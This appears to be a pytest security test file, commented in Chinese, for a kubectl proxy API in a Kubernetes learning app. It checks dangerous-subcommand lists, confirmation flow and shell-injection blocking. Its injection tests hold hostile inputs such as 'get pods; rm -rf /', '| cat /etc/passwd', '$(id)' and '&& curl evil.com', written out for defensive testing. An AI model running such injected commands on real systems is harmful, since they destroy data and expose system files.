"""QA 攻击测试：终端安全 - kubectl 代理安全验证。

针对 P0-2 报告：终端 Tab 是真实 kubectl 代理（安全风险）。
- /api/kubectl 真实执行 kubectl
- ch21 含破坏性操作无风险提示

测试维度:
1. 白名单边界测试（apply 不在 DANGEROUS 但可执行破坏性 YAML）
2. 命令注入攻击（shell metacharacter bypass）
3. 危险命令确认流程（force 参数绕过）
4. ch21 破坏性命令安全提示验证
5. 命令拼接/编码绕过攻击
"""
import pytest
from fastapi.testclient import TestClient
from app.main import app
from app.cluster import ClusterManager

client = TestClient(app, raise_server_exceptions=False)


class TestWhitelistBoundary:
    """白名单边界测试 - apply/create/patch 现已在 DANGEROUS 列表中（P0-2 已修复）。"""

    def test_apply_now_in_dangerous(self):
        """apply 命令现在在 DANGEROUS 列表中（P0-2 已修复）。"""
        assert "apply" in ClusterManager.DANGEROUS_SUBCOMMANDS, (
            "apply 应在 DANGEROUS 列表中，"
            "因为 kubectl apply -f <destructive.yaml> 可以执行破坏性操作"
        )

    def test_apply_in_allowed(self):
        """apply 在 ALLOWED 列表中，可以被直接执行。"""
        assert "apply" in ClusterManager.ALLOWED_SUBCOMMANDS

    def test_create_now_in_dangerous(self):
        """create 命令现在在 DANGEROUS 列表中（P0-2 已修复）。"""
        assert "create" in ClusterManager.DANGEROUS_SUBCOMMANDS, (
            "create 应在 DANGEROUS 列表中，"
            "因为 kubectl create 可以创建任意资源"
        )

    def test_patch_now_in_dangerous(self):
        """patch 命令现在在 DANGEROUS 列表中（P0-2 已修复）。"""
        assert "patch" in ClusterManager.DANGEROUS_SUBCOMMANDS

    def test_delete_in_dangerous(self):
        """delete 命令应在 DANGEROUS 列表中。"""
        assert "delete" in ClusterManager.DANGEROUS_SUBCOMMANDS

    def test_exec_in_dangerous(self):
        """exec 命令应在 DANGEROUS 列表中。"""
        assert "exec" in ClusterManager.DANGEROUS_SUBCOMMANDS

    def test_forbidden_subcommands(self):
        """禁止的子命令列表。"""
        assert "destroy" in ClusterManager.FORBIDDEN_SUBCOMMANDS
        assert "reset" in ClusterManager.FORBIDDEN_SUBCOMMANDS
        assert "init" in ClusterManager.FORBIDDEN_SUBCOMMANDS


class TestCommandInjectionAttack:
    """命令注入攻击测试。"""

    @pytest.mark.parametrize("malicious_cmd", [
        "get pods; rm -rf /",
        "get pods | cat /etc/passwd",
        "get pods & background_job",
        "get pods `whoami`",
        "get pods $(id)",
        "get pods > /tmp/pwned",
        "get pods < /dev/urandom",
        "get pods\nrm -rf /",
        "get pods\r\nrm -rf /",
        "get pods && curl evil.com",
        "get pods || true",
    ])
    def test_shell_metacharacter_blocked(self, malicious_cmd):
        """Shell 元字符注入应被阻止。"""
        ok, err, args = ClusterManager._validate_kubectl_command(malicious_cmd)
        assert ok is False, f"Shell injection not blocked: {malicious_cmd}"
        assert err  # 应有错误消息

    def test_command_with_quotes(self):
        """带引号的命令应正确解析。"""
        ok, err, args = ClusterManager._validate_kubectl_command(
            'get pod nginx -o jsonpath="{.metadata.name}"'
        )
        # jsonpath 含 {} 不应被误判为注入
        # 注意: 当前实现禁止 ( 和 ) 但不禁止 { 和 }
        # 需确认 {} 是否在 dangerous_chars 中
        print(f"Quotes test: ok={ok}, err={err}, args={args}")

    def test_command_with_equals(self):
        """带等号的参数应正常通过。"""
        ok, err, args = ClusterManager._validate_kubectl_command(
            "get pods --selector=app=nginx"
        )
        assert ok is True, f"Equals sign should be allowed: {err}"

    def test_unicode_bypass_attempt(self):
        """Unicode 字符绕过尝试。"""
        # 全角分号
        ok, err, args = ClusterManager._validate_kubectl_command(
            "get pods； rm -rf /"
        )
        # 全角分号 ; (U+FF1B) 不在 dangerous_chars 列表中
        # 但 shlex.split 应该把它当作参数的一部分
        print(f"Unicode bypass: ok={ok}, err={err}, args={args}")

    def test_null_byte_injection(self):
        """Null 字节注入。"""
        ok, err, args = ClusterManager._validate_kubectl_command(
            "get pods\x00; rm -rf /"
        )
        assert ok is False, "Null byte injection should be blocked"

    def test_chained_kubectl_commands(self):
        """链式 kubectl 命令尝试。"""
        ok, err, args = ClusterManager._validate_kubectl_command(
            "get pods kubectl delete all --all"
        )
        # 这会作为一个命令解析，subcommand=get
        # 但参数中包含 kubectl delete - 不应被特殊处理
        # get 在白名单中所以会通过验证
        print(f"Chained kubectl: ok={ok}, err={err}, args={args}")


class TestDangerousCommandConfirm:
    """危险命令确认流程测试。"""

    def test_delete_needs_confirm_in_simulator(self):
        """模拟器模式下 delete 命令应返回错误（集群未启用）。"""
        r = client.post("/api/kubectl", json={"command": "delete pod nginx"})
        assert r.status_code == 200
        data = r.json()
        assert data["success"] is False
        # 模拟器模式下所有命令返回"集群模式未启用"
        # 但命令验证应该在集群模式检查之前
        print(f"Delete in simulator: {data}")

    def test_force_bypasses_confirm(self):
        """force=true 应绕过确认。"""
        # 在模拟器模式下，force 不影响行为（都返回未启用）
        r = client.post("/api/kubectl", json={
            "command": "delete pod nginx",
            "force": True
        })
        assert r.status_code == 200
        data = r.json()
        assert data["success"] is False  # 模拟器模式

    def test_dangerous_flag_in_response(self):
        """模拟器模式下 dangerous 标志应正确设置。"""
        # 模拟器模式下，命令验证在集群检查之前
        # delete 是有效子命令，通过验证
        # 然后返回集群未启用
        r = client.post("/api/kubectl", json={"command": "delete pod nginx"})
        data = r.json()
        # 在模拟器模式下 dangerous=False 因为没到危险检测步骤
        print(f"Dangerous flag: {data.get('dangerous')}, needs_confirm: {data.get('needs_confirm')}")

    def test_apply_now_needs_confirm(self):
        """apply 现在需要确认（P0-2 已修复）。"""
        ok, err, args = ClusterManager._validate_kubectl_command("apply -f -")
        assert ok is True
        # apply 现在在 DANGEROUS 中
        assert "apply" in ClusterManager.DANGEROUS_SUBCOMMANDS

    def test_scale_needs_confirm(self):
        """scale 需要确认。"""
        assert "scale" in ClusterManager.DANGEROUS_SUBCOMMANDS


class TestCh21DestructiveOps:
    """ch21 破坏性命令安全提示验证。"""

    def test_drain_in_dangerous(self):
        """drain 命令应在 DANGEROUS 列表中。"""
        assert "drain" in ClusterManager.DANGEROUS_SUBCOMMANDS

    def test_cordon_in_dangerous(self):
        """cordon 命令应在 DANGEROUS 列表中。"""
        assert "cordon" in ClusterManager.DANGEROUS_SUBCOMMANDS

    def test_uncordon_in_dangerous(self):
        """uncordon 命令应在 DANGEROUS 列表中。"""
        assert "uncordon" in ClusterManager.DANGEROUS_SUBCOMMANDS

    def test_taint_in_dangerous(self):
        """taint 命令应在 DANGEROUS 列表中。"""
        assert "taint" in ClusterManager.DANGEROUS_SUBCOMMANDS

    def test_ch21_lesson_contains_warning(self):
        """ch21 关卡的 lesson 应包含破坏性操作警告。"""
        from app.validator import get_level

        for i in range(1, 6):
            level = get_level(f"Q21.{i}")
            concept = level.lesson.concept if level.lesson else ""
            # 检查是否有警告/风险提示
            has_warning = any(kw in concept for kw in [
                "警告", "风险", "注意", "危险", "caution", "warning",
                "备份", "停止", "影响", "生产"
            ])
            if not has_warning:
                pytest.fail(
                    f"Q21.{i} lesson 缺少破坏性操作风险提示。"
                    f"Concept 前200字: {concept[:200]}"
                )

    def test_ch21_check_fn_rejects_empty(self):
        """ch21 所有 check_fn 应拒绝空输入。"""
        from app.validator import get_level

        for i in range(1, 6):
            level = get_level(f"Q21.{i}")
            result = level.check_fn("")
            assert not result.ok, f"Q21.{i} should reject empty input"

    def test_ch21_check_fn_rejects_garbage(self):
        """ch21 所有 check_fn 应拒绝垃圾输入。"""
        from app.validator import get_level

        for i in range(1, 6):
            level = get_level(f"Q21.{i}")
            result = level.check_fn("garbage not a command")
            assert not result.ok, f"Q21.{i} should reject garbage input"


class TestKubectlWhitelistEndpoint:
    """白名单 API 端点测试。"""

    def test_whitelist_returns_allowed_and_dangerous(self):
        r = client.get("/api/kubectl/whitelist")
        assert r.status_code == 200
        data = r.json()
        assert "allowed" in data
        assert "dangerous" in data
        assert "get" in data["allowed"]
        assert "delete" in data["dangerous"]

    def test_whitelist_mode(self):
        r = client.get("/api/kubectl/whitelist")
        data = r.json()
        assert data["mode"] in ("simulator", "cluster")

    def test_whitelist_namespace(self):
        r = client.get("/api/kubectl/whitelist")
        data = r.json()
        assert "namespace" in data

    def test_apply_now_flagged_dangerous_in_whitelist(self):
        """apply 在白名单端点返回的 dangerous 列表中（P0-2 已修复）。"""
        r = client.get("/api/kubectl/whitelist")
        data = r.json()
        dangerous = data.get("dangerous", [])
        assert "apply" in dangerous, (
            "apply 应在 dangerous 列表中，"
            "因为 kubectl apply 可执行任意破坏性 YAML"
        )


class TestKubectlRequestValidation:
    """KubectlRequest 模型验证测试。"""

    def test_missing_command_field(self):
        """缺少 command 字段应返回 422。"""
        r = client.post("/api/kubectl", json={})
        assert r.status_code in (422, 200)

    def test_empty_command(self):
        """空命令应被拒绝。"""
        r = client.post("/api/kubectl", json={"command": ""})
        assert r.status_code == 200
        assert r.json()["success"] is False

    def test_very_long_command(self):
        """超长命令应被优雅处理。"""
        long_cmd = "get pods " + "x" * 10000
        r = client.post("/api/kubectl", json={"command": long_cmd})
        assert r.status_code == 200  # 不应 500

    def test_command_with_newlines(self):
        """含换行符的命令应被拒绝。"""
        r = client.post("/api/kubectl", json={
            "command": "get pods\nrm -rf /"
        })
        assert r.status_code == 200
        assert r.json()["success"] is False

    def test_non_string_command(self):
        """非字符串 command 应被 Pydantic 拒绝。"""
        r = client.post("/api/kubectl", json={"command": 12345})
        assert r.status_code in (422, 200)

    def test_null_command(self):
        """null command 应被拒绝。"""
        r = client.post("/api/kubectl", json={"command": None})
        assert r.status_code in (422, 200)
